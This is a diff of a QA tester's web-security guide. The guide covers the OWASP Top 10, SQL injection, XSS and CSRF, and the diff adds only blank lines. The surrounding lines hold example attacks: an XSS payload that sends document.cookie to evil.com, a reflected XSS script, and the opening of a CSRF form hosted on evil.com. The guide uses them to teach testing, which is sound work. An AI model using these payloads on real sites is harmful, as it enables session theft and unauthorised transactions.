@@ -56,6 +56,8 @@ Your Role as QA:
 **Top 10 Web Application Security Risks:**
 
 ```
+
+
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 OWASP TOP 10 - 2021
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -166,6 +168,8 @@ if result:
 
 **Attack Scenario:**
 ```
+
+
 Normal Input:
 Username: john
 Password: pass123
@@ -310,12 +314,16 @@ Impact:
 - Deface website
 - Keylogging
 - Steal sensitive data
+
+
 ```
 
 **XSS Attack Examples:**
 
 **1. Reflected XSS:**
 ```
+
+
 Vulnerable URL:
 https://example.com/search?q=<script>alert('XSS')</script>
 
@@ -325,6 +333,8 @@ If page displays search query without sanitizing:
 Browser executes the script!
 
 Malicious Use:
+
+
 https://example.com/search?q=<script>
   fetch('https://evil.com/steal?cookie=' + document.cookie)
 </script>
@@ -334,6 +344,8 @@ Attacker sends link to victim → Victim's cookies stolen
 
 **2. Stored XSS:**
 ```
+
+
 Scenario: Blog comment section
 
 Attacker posts comment:
@@ -349,6 +361,8 @@ Impact: Affects ALL users, not just one
 ```
 
 **3. DOM-based XSS:**
+
+
 ```javascript
 // Vulnerable JavaScript code
 var name = location.hash.substring(1);
@@ -361,6 +375,8 @@ Result: Script executes in user's browser
 **XSS Test Cases:**
 
 ```
+
+
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 CROSS-SITE SCRIPTING (XSS) TEST SCENARIOS
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -529,6 +545,8 @@ How it works:
 1. User logs into bank.com (gets session cookie)
 2. User visits evil.com (while still logged in)
 3. evil.com contains hidden form that posts to bank.com
+
+
 4. Form auto-submits using user's session
 5. Bank.com thinks user intentionally made request
 6. Money transferred without user's knowledge
@@ -544,6 +562,8 @@ Impact:
 **CSRF Attack Example:**
 
 ```html
+
+
 <!-- Attacker's website: evil.com -->
 <html>
 <body>
@@ -2154,6 +2174,8 @@ Purpose: Delete resource
 Example: DELETE /api/users/123
 Returns: Success message or empty response
 Safe: No
+
+
 Idempotent: Yes (delete once or multiple times, same result)
 
 HEAD - Get headers only
@@ -2172,6 +2194,8 @@ Use case: CORS preflight requests
 
 **CRUD Mapping:**
 ```
+
+
 CREATE → POST
 READ   → GET
 UPDATE → PUT / PATCH
